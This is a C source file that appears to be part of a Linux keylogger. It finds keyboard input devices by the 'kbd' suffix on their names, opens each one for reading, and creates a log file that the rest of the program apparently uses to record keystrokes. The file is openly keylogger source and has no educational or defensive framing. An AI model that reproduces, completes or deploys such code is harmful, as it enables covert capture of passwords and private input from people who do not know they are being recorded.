
#include "keylogger.h"
#include <stdbool.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>
#include <errno.h>
#include <unistd.h>
#include <limits.h>

static int is_keyboard(const struct dirent *file)
{
    size_t len = strlen(file->d_name);

    return file->d_name[len - 3] == 'k'
    && file->d_name[len - 2] == 'b'
    && file->d_name[len - 1] == 'd';
}

int *get_keyboard_paths(int logfd)
{
    struct dirent **char_devices = 0x0;
    int possible_paths = scandir(DIR_PATH, &char_devices, &is_keyboard, &alphasort);
    int *result = NULL;
    char *rpath = NULL;

    if (possible_paths == -1 || chdir(DIR_PATH) < 0) {
        dprintf(logfd, "Error:%s\n", strerror(errno));
        return NULL;
    }

    rpath = malloc(sizeof(char) * BUFFER_SIZE);
    result = malloc(sizeof(int) * (possible_paths + 1));

    if (!rpath || !result) {
        dprintf(logfd, "Error: could not allocate memory.\n");
        return NULL;
    }

    result[possible_paths] = -1;

    for (int ctr = -1; ++ctr < possible_paths;) {
        dprintf(logfd, "Found keyboard:%s\n", char_devices[ctr]->d_name);
        rpath = realpath(char_devices[ctr]->d_name, rpath);
        result[ctr] = open(rpath, O_RDONLY);
    }

      for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);

    return result;
}

int setup_log(void)
{
    int result = open(LOG_PATH, O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR);

    return result;
}
